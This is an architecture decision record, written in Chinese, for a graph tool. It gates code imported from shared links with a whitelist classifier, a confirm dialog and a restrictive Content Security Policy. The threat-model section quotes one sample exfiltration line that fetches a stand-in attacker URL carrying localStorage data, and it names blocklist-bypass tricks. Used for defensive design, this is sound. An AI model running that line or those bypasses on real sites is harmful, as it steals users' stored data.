# ADR-008 外部导入执行闸门:白名单分类 + 确认 + CSP

- 状态:accepted
- 日期:2026-09-19
- 关联:ADR-009(AI 传输契约,闸门是其前置);llms.txt 安全约定("方法体禁 fetch"仅为文档约定)

## [是什么] 背景

分享链接的载入路径无任何执行确认:`main.js` 读 `location.hash` → `fromB64` → `JSON.parse` → `importSource` → `runSource`,而 `runSource` 用 `new Function` 执行 sourceCode(`codegraph.js:220`)——**顶层代码在打开链接的瞬间执行**。transform 同样走 `new Function`(`engine.js:171`)。

现有 `isSourceCodeProgrammatic`(`parser.js:469`)只查控制流关键字与方法定义,它的用途是"切 UI 模式会丢什么",**不是安全边界**:一段

```js
fetch('https://evil.example/?' + localStorage.sa_data)
```

是合法顶层语句,能混过它并被静默执行。

**威胁模型**:攻击者 = 任何能发链接的人(聊天/邮件);资产 = 本 origin 的 localStorage(用户全部图,可能含敏感系统描述)及同 origin 其他数据;爆炸半径取决于托管域(专用子域 = 仅本工具数据;共享域如 `username.github.io` = 殃及其他项目)。

注意这与 llms.txt 已承认的"URL 是明文 base64、勿放密钥"是**不同问题**:那是机密性,这里是完整性/执行。

## [为什么] 决策

### 1. 分类器 `classifySource(code)` → `'declarative' | 'programmatic' | 'unknown'`

放 `parser.js`,与 `isSourceCodeProgrammatic` 并列但**不共用**(后者语义是"切模式丢什么",保持不动):

- `'programmatic'`:控制流 / 方法体 / 箭头函数——用字符串、注释、模板串感知的 tokenizer 判定(修掉现有正则对注释/字符串的误判)
- 否则做**顶层语句白名单**:逐条放行
  - 3-field class(`description` / `name` / `attrs`,字段值限字面量:原始值 / 数组 / 纯对象)
  - `const X = GraphStarter.add(Class)` 或 `add(Class, 'name')`
  - `X.edges = [ { target: Y, description: '…', transform: '…' } ]`(`transform` 是字符串数据,载入时不执行)
  - `X.key = <字面量 | 实例引用>`
  - 注释 / 空行
- `'unknown'`:其余任何顶层语句(`fetch(…)`、`alert(…)`、`import`、IIFE、模板串插值…);语句切分或解析失败也归 `'unknown'`(**保守入闸**)

### 2. 闸门位置:`importSource` 内部

`importSource` 是所有外部来源的唯一咽喉(URL hash、文件导入、粘贴导入、测试 API);`load()`(localStorage)不过闸——那是用户自己的数据。

### 3. 交互:白名单 + 阻断式 confirm

- `declarative` → 静默运行(绝大多数 AI 生成的声明式图无感)
- `programmatic` / `unknown` → `confirm('此链接包含可执行代码…是否载入并运行?')`
  - 确定 = 运行;取消 = 不载入(URL 场景清 hash、回退本地已存图)
- 极端情况弹两次(程序化图 + `editMode:'ui'` 触发既有模式确认),罕见,接受

### 4. meta CSP:`src/index.html`(dev/build 同源)

```
default-src 'self'
script-src 'self' 'unsafe-inline' 'unsafe-eval'
style-src 'self' 'unsafe-inline'
img-src 'self' data:
font-src 'self' data:
connect-src 'none'
object-src 'none'; base-uri 'none'; form-action 'none'; worker-src 'none'
```

`new Function` 是架构依赖,`unsafe-eval` 必须保留——**CSP 只能锁"出口"不能锁"入口",而锁的正是 exfil 通道**(`connect-src` 掐 fetch/XHR/WebSocket,`img-src` 掐图片外带)。已核实 src 无任何运行时网络请求,不伤自身。

## 被拒方案

- **静态 token 黑名单**(拒绝 `fetch` / `eval` / `import` 等):可绕过(字符串拼接、`constructor.constructor`),且无法把"可安全静默"的声明式图与未知代码分开——白名单分类取代
- **一律确认**:声明式图占绝对多数,日常骚扰,与"用完即走"定位冲突
- **不运行任何外部代码**(只允许用户手贴):杀死"点开链接即见图"的核心体验
- **Worker / iframe 沙箱**:attrs 的实例引用模型与 structured clone 冲突,属重架构,远期
- **CSP 禁 `unsafe-eval` 锁入口**:`new Function` 是架构依赖,不可能;锁出口已覆盖主要 exfil 路径
- **对 localStorage 载入也过闸**:用户自己的数据,无威胁模型

## 影响面

- `parser.js`:新增 `classifySource`(语句级 tokenizer + 白名单)
- `io.js`:`importSource` 接线闸门(取消路径与回退)
- `main.js`:URL 取消载入时清 hash、回退本地图
- `index.html`:meta CSP
- 测试:`test-roundtrip` 分类器单测(关键边界:字符串内含 `fetch(` 判 declarative、注释内含 `for(` 不误伤、`X.key = Y` 引用放行);`test-e2e`(程序化 URL accept→载入 / dismiss→回退、声明式 URL 零弹窗、CSP meta 断言)
- 文档:`CLAUDE.md` 不变量、`docs/architecture.md` 模块表、`CHANGELOG.md`、`src/llms.txt`(执行确认是预期行为)

## [不变量]

28. **外部导入的 sourceCode 必须先过 `classifySource`**,`declarative` 才免确认;`load()`(localStorage)不过闸。
29. **新外部入口必须走 `importSource`**(闸门唯一咽喉),不得绕过直接 `runSource`。
30. **dist/index.html 必须携带 meta CSP**(含 `connect-src 'none'`);不得引入任何运行时网络请求(否则 CSP 反噬自身)。
